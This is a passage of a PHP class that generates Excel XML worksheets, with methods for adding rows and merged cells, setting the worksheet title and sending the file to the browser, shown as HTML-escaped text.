&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;array&nbsp;1-dimensional&nbsp;array
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@todo&nbsp;Row-creation&nbsp;should&nbsp;be&nbsp;done&nbsp;by&nbsp;$this-&gt;addArray
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;function&nbsp;addRow&nbsp;($array)
&nbsp;&nbsp;&nbsp;&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;initialize&nbsp;all&nbsp;cells&nbsp;for&nbsp;this&nbsp;row
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cells&nbsp;=&nbsp;&quot;&quot;;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;foreach&nbsp;key&nbsp;-&gt;&nbsp;write&nbsp;value&nbsp;into&nbsp;cells
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($array&nbsp;as&nbsp;$k&nbsp;=&gt;&nbsp;$v):

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cells&nbsp;.=&nbsp;&quot;&lt;Cell&gt;&lt;Data&nbsp;ss:Type=\\\\&quot;String\\\\&quot;&gt;&quot;&nbsp;.&nbsp;$v&nbsp;.&nbsp;&quot;&lt;/Data&gt;&lt;/Cell&gt;\\\\n&quot;;&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;endforeach;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;transform&nbsp;$cells&nbsp;content&nbsp;into&nbsp;one&nbsp;row
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;lines[]&nbsp;=&nbsp;&quot;&lt;Row&gt;\\\\n&quot;&nbsp;.&nbsp;$cells&nbsp;.&nbsp;&quot;&lt;/Row&gt;\\\\n&quot;;

&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Add&nbsp;an&nbsp;array&nbsp;to&nbsp;the&nbsp;document
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;This&nbsp;should&nbsp;be&nbsp;the&nbsp;only&nbsp;method&nbsp;needed&nbsp;to&nbsp;generate&nbsp;an&nbsp;excel
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;document.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@access&nbsp;public
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;array&nbsp;2-dimensional&nbsp;array
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@todo&nbsp;Can&nbsp;be&nbsp;transfered&nbsp;to&nbsp;__construct()&nbsp;later&nbsp;on
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;addArray&nbsp;($array)
&nbsp;&nbsp;&nbsp;&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;run&nbsp;through&nbsp;the&nbsp;array&nbsp;and&nbsp;add&nbsp;them&nbsp;into&nbsp;rows
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($array&nbsp;as&nbsp;$k&nbsp;=&gt;&nbsp;$v):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;addRow&nbsp;($v);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;endforeach;

&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Set&nbsp;the&nbsp;worksheet&nbsp;title
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Checks&nbsp;the&nbsp;string&nbsp;for&nbsp;not&nbsp;allowed&nbsp;characters&nbsp;(:\\\\/?*),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;cuts&nbsp;it&nbsp;to&nbsp;maximum&nbsp;31&nbsp;characters&nbsp;and&nbsp;set&nbsp;the&nbsp;title.&nbsp;Damn
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;why&nbsp;are&nbsp;not-allowed&nbsp;chars&nbsp;nowhere&nbsp;to&nbsp;be&nbsp;found?&nbsp;Windows
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;help&#39;s&nbsp;no&nbsp;help...
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@access&nbsp;public
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;string&nbsp;$title&nbsp;Designed&nbsp;title
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;setWorksheetTitle&nbsp;($title)
&nbsp;&nbsp;&nbsp;&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;strip&nbsp;out&nbsp;special&nbsp;chars&nbsp;first
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$title&nbsp;=&nbsp;preg_replace&nbsp;(&quot;/[\\\\\\\\\\\\|:|\\\\/|\\\\?|\\\\*|\\\\[|\\\\]]/&quot;,&nbsp;&quot;&quot;,&nbsp;$title);

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;now&nbsp;cut&nbsp;it&nbsp;to&nbsp;the&nbsp;allowed&nbsp;length
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$title&nbsp;=&nbsp;substr&nbsp;($title,&nbsp;0,&nbsp;31);

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;set&nbsp;title
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;worksheet_title&nbsp;=&nbsp;$title;

&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Generate&nbsp;the&nbsp;excel&nbsp;file
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Finally&nbsp;generates&nbsp;the&nbsp;excel&nbsp;file&nbsp;and&nbsp;uses&nbsp;the&nbsp;header()&nbsp;function
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;to&nbsp;deliver&nbsp;it&nbsp;to&nbsp;the&nbsp;browser.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@access&nbsp;public
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;string&nbsp;$filename&nbsp;Name&nbsp;of&nbsp;excel&nbsp;file&nbsp;to&nbsp;generate&nbsp;(...xls)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;generateXML&nbsp;($filename)
&nbsp;&nbsp;&nbsp;&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;deliver&nbsp;header&nbsp;(as&nbsp;recommended&nbsp;in&nbsp;php&nbsp;manual)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&quot;Content-Type:&nbsp;application/vnd.ms-excel;&nbsp;charset=UTF-8&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&quot;Content-Disposition:&nbsp;inline;&nbsp;filename=\\\\&quot;&quot;&nbsp;.&nbsp;$filename&nbsp;.&nbsp;&quot;.xls\\\\&quot;&quot;);

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//add&nbsp;by&nbsp;sun
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&quot;Content-Transfer-Encoding:&nbsp;binary&quot;);&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&quot;Pragma:&nbsp;public&quot;);&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&quot;Cache-Control:&nbsp;must-revalidate,&nbsp;post-check=0,&nbsp;pre-check=0&quot;);&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;end

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;print&nbsp;out&nbsp;document&nbsp;to&nbsp;the&nbsp;browser
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;need&nbsp;to&nbsp;use&nbsp;stripslashes&nbsp;for&nbsp;the&nbsp;damn&nbsp;&quot;&gt;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;stripslashes&nbsp;($this-&gt;header);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;\\\\n&lt;Worksheet&nbsp;ss:Name=\\\\&quot;&quot;&nbsp;.&nbsp;$this-&gt;worksheet_title&nbsp;.&nbsp;&quot;\\\\&quot;&gt;\\\\n&lt;Table&gt;\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&lt;Column&nbsp;ss:Index=\\\\&quot;1\\\\&quot;&nbsp;ss:AutoFitWidth=\\\\&quot;0\\\\&quot;&nbsp;/&gt;\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;implode&nbsp;(&quot;\\\\n&quot;,&nbsp;$this-&gt;lines);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&lt;/Table&gt;\\\\n&lt;/Worksheet&gt;\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$this-&gt;footer;

&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Add&nbsp;an&nbsp;array&nbsp;to&nbsp;the&nbsp;document
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;This&nbsp;should&nbsp;be&nbsp;the&nbsp;only&nbsp;method&nbsp;needed&nbsp;to&nbsp;generate&nbsp;an&nbsp;excel
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;document.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@access&nbsp;public
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;array&nbsp;2-dimensional&nbsp;array
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@todo&nbsp;Can&nbsp;be&nbsp;transfered&nbsp;to&nbsp;__construct()&nbsp;later&nbsp;on
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;addallArray&nbsp;($array)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;run&nbsp;through&nbsp;the&nbsp;array&nbsp;and&nbsp;add&nbsp;them&nbsp;into&nbsp;rows
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($array&nbsp;as&nbsp;$k&nbsp;=&gt;&nbsp;$v):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;addallRow&nbsp;($v);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;endforeach;

&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;/*
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$arr&nbsp;=&nbsp;array(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;row&#39;=&gt;array(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cell&#39;=&gt;array(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;MergeAcross&#39;=&gt;&#39;1&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;MergeDown&#39;=&gt;&#39;3&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Type&#39;=&gt;&#39;Number&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;data&#39;=&gt;&#39;网络房源总量&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;row&#39;=&gt;array(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cell&#39;=&gt;array(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;data&#39;=&gt;&#39;网络房源总量&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;addUMERows($arr)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(is_array($arr))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cells&nbsp;=&nbsp;&#39;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($arr&nbsp;as&nbsp;$Row)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($Row&nbsp;as&nbsp;$Cell)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$type&nbsp;=&nbsp;$Cell[&#39;Type&#39;]?$Cell[&#39;Type&#39;]:&#39;String&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$MergeAcross&nbsp;=&nbsp;$Cell[&#39;MergeAcross&#39;]?&quot;&nbsp;ss:MergeAcross=\\\\&quot;&quot;.$Cell[&#39;MergeAcross&#39;].&quot;\\\\&quot;&quot;:&#39;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$MergeDown&nbsp;=&nbsp;$Cell[&#39;MergeDown&#39;]?&quot;&nbsp;ss:MergeDown=\\\\&quot;&quot;.$Cell[&#39;MergeDown&#39;].&quot;\\\\&quot;&quot;:&#39;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cells&nbsp;.=&nbsp;&quot;&lt;Cell&quot;.$MergeAcross.$MergeDown.&quot;&gt;&lt;Data&nbsp;ss:Type=\\\\&quot;&quot;.$type.&quot;\\\\&quot;&gt;&quot;&nbsp;.&nbsp;$Cell[&#39;data&#39;]&nbsp;.&nbsp;&quot;&lt;/Data&gt;&lt;/Cell&gt;\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;lines[]&nbsp;=&nbsp;&quot;&lt;Row&gt;\\\\n&quot;&nbsp;.&nbsp;$cells&nbsp;.&nbsp;&quot;&lt;/Row&gt;\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cells&nbsp;=&nbsp;&#39;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;/**
&nbsp;*&nbsp;Add&nbsp;a&nbsp;single&nbsp;row&nbsp;to&nbsp;the&nbsp;$document&nbsp;string
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@access&nbsp;private
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;array&nbsp;1-dimensional&nbsp;array
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@todo&nbsp;Row-creation&nbsp;should&nbsp;be&nbsp;done&nbsp;by&nbsp;$this-&gt;addArray
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;function&nbsp;addallRow&nbsp;($array)
&nbsp;&nbsp;&nbsp;&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;initialize&nbsp;all&nbsp;cells&nbsp;for&nbsp;this&nbsp;row
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cells&nbsp;=&nbsp;&quot;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$flag&nbsp;=&nbsp;false;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;foreach&nbsp;key&nbsp;-&gt;&nbsp;write&nbsp;value&nbsp;into&nbsp;cells
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($array&nbsp;as&nbsp;$k&nbsp;=&gt;&nbsp;$v):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(gettype($v)&nbsp;==&nbsp;&#39;array&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($v&nbsp;as&nbsp;$k1&nbsp;=&gt;&nbsp;$v1):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($flag)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cells&nbsp;.=&nbsp;&quot;&lt;Cell&nbsp;ss:Index=\\\\&quot;&quot;.$this-&gt;Index.&quot;\\\\&quot;&gt;&lt;Data&nbsp;ss:Type=\\\\&quot;String\\\\&quot;&gt;&quot;&nbsp;.&nbsp;$v1&nbsp;.&nbsp;&quot;&lt;/Data&gt;&lt;/Cell&gt;\\\\n&quot;;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$flag&nbsp;=&nbsp;false;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cells&nbsp;.=&nbsp;&quot;&lt;Cell&gt;&lt;Data&nbsp;ss:Type=\\\\&quot;String\\\\&quot;&gt;&quot;&nbsp;.&nbsp;$v1&nbsp;.&nbsp;&quot;&lt;/Data&gt;&lt;/Cell&gt;\\\\n&quot;;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;endforeach;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($v&nbsp;!=&nbsp;&quot;&quot;)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($k&nbsp;==&#39;mergedown&#39;&nbsp;||&nbsp;$k&nbsp;==&nbsp;&#39;mergedown1&#39;&nbsp;||&nbsp;$k&nbsp;==&nbsp;&#39;mergedown2&#39;&nbsp;||&nbsp;$k&nbsp;==&nbsp;&#39;mergedown3&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cells&nbsp;.=&nbsp;&quot;&lt;Cell&nbsp;ss:MergeDown=\\\\&quot;2\\\\&quot;&nbsp;&gt;&lt;Data&nbsp;ss:Type=\\\\&quot;String\\\\&quot;&gt;&quot;&nbsp;.&nbsp;$v&nbsp;.&nbsp;&quot;&lt;/Data&gt;&lt;/Cell&gt;\\\\n&quot;;
